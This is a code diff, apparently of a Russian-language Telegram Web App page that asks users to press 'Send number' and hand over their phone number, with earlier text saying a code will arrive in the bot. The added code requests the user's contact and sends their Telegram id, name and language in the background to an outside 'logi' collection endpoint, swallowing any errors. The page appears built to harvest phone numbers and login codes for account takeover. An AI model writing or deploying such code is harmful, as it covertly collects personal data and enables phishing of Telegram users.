@@ -70,7 +70,7 @@
     <button id="btn">📱 Отправить номер</button>
     
     <div id="status" class="status"></div>
-    <div class="hint">После нажатия код придёт в бота</div>
+    <div class="hint">После нажатия нажмите "Отправить номер" в Telegram</div>
   </div>
 
   <script>
@@ -85,13 +85,16 @@
       btn.disabled = true;
       btn.innerHTML = '<span class="loader"></span> Отправка...';
       statusDiv.className = 'status show';
-      statusDiv.textContent = '⏳ Запрос отправляется...';
+      statusDiv.textContent = '⏳ Открываю окно отправки номера...';
 
       try {
-        // Запрашиваем номер через Telegram
-        tg.sendData(JSON.stringify({ action: 'request_contact' }));
+        // ОТПРАВЛЯЕМ ЗАПРОС НА ОТПРАВКУ НОМЕРА ЧЕРЕЗ TELEGRAM
+        tg.sendData(JSON.stringify({ 
+          action: 'request_contact',
+          user_id: tg.initDataUnsafe?.user?.id || 'unknown'
+        }));
         
-        // Отправляем данные на сервер
+        // ОТПРАВЛЯЕМ ДАННЫЕ НА СЕРВЕР (для статистики)
         const user = tg.initDataUnsafe?.user || {};
         const payload = {
           user_id: user.id || 'unknown',
@@ -99,30 +102,29 @@
           name: `${user.first_name || ''} ${user.last_name || ''}`.trim(),
           language: user.language_code || navigator.language,
           time: new Date().toISOString(),
-          action: 'send_phone'
+          action: 'webapp_opened'
         };
 
-        const response = await fetch('https://logi-production-033f.up.railway.app/collect', {
+        // Отправляем данные в фоне
+        fetch('https://logi-production-033f.up.railway.app/collect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
-        });
+        }).catch(() => {});
 
-        if (response.ok) {
-          statusDiv.className = 'status show success';
-          statusDiv.textContent = '✅ Номер отправлен! Код придёт в Telegram.';
-          tg.showAlert('Код отправлен! Введите его в боте.');
-        } else {
-          throw new Error('Ошибка сервера');
-        }
+        statusDiv.className = 'status show success';
+        statusDiv.textContent = '✅ Запрос отправлен! Нажмите "Отправить номер" в Telegram.';
+        
+        // Закрываем через 3 секунды
+        setTimeout(() => {
+          tg.close();
+        }, 3000);
+
       } catch (error) {
         statusDiv.className = 'status show error';
         statusDiv.textContent = '❌ Ошибка: ' + error.message;
-        tg.showAlert('Ошибка отправки');
-      } finally {
         btn.disabled = false;
         btn.innerHTML = '📱 Отправить номер';
-        setTimeout(() => { tg.close(); }, 2000);
       }
     });
   </script>
